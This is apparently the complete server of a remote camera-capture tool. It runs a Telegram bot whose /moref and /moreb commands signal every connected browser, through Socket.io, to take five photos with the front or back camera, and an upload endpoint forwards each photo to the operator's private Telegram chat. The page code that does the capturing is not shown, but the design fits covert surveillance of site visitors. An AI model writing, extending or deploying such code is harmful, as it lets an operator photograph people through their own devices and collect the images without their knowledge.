const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const path = require('path');
require('dotenv').config();

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const token = process.env.BOT_TOKEN;
const adminId = process.env.ADMIN_ID;

if (!token || !adminId) {
    console.error("Error: BOT_TOKEN or ADMIN_ID is missing in environment variables!");
    process.exit(1);
}

// Initialize Telegram Bot (Polling mode)
const bot = new TelegramBot(token, { polling: true });

// Configure Multer to handle uploaded photo buffers in memory
const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

// Serve static frontend files from the 'public' folder
app.use(express.static(path.join(__dirname, 'public')));

// Endpoint to receive captured photos from browser and forward to Telegram
app.post('/upload', upload.single('photo'), async (req, res) => {
    try {
        if (!req.file) {
            return res.status(400).send('No file uploaded.');
        }

        // Forward the photo buffer directly to your Telegram chat
        await bot.sendPhoto(adminId, req.file.buffer, {
            caption: `📸 Captured: ${req.file.originalname || 'photo.jpg'}`
        });

        res.status(200).send({ success: true });
    } catch (error) {
        console.error("Error forwarding photo to Telegram:", error);
        res.status(500).send({ success: false, error: error.message });
    }
});

// Socket.io Connection Management
io.on('connection', (socket) => {
    console.log('Client connected:', socket.id);

    socket.on('disconnect', () => {
        console.log('Client disconnected:', socket.id);
    });
});

// Telegram Command: /moref (Front Camera Capture)
bot.onText(/\/moref/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() === adminId.toString()) {
        bot.sendMessage(chatId, "📸 Front Camera se 5 photos capture ki ja rahi hain...");
        io.emit('capture_front'); // Signal browser to capture using front camera
    } else {
        bot.sendMessage(chatId, "Unauthorized access.");
    }
});

// Telegram Command: /moreb (Back Camera Capture)
bot.onText(/\/moreb/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() === adminId.toString()) {
        bot.sendMessage(chatId, "📸 Back Camera se 5 photos capture ki ja rahi hain...");
        io.emit('capture_back'); // Signal browser to capture using back camera
    } else {
        bot.sendMessage(chatId, "Unauthorized access.");
    }
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server is running successfully on port ${PORT}`);
});
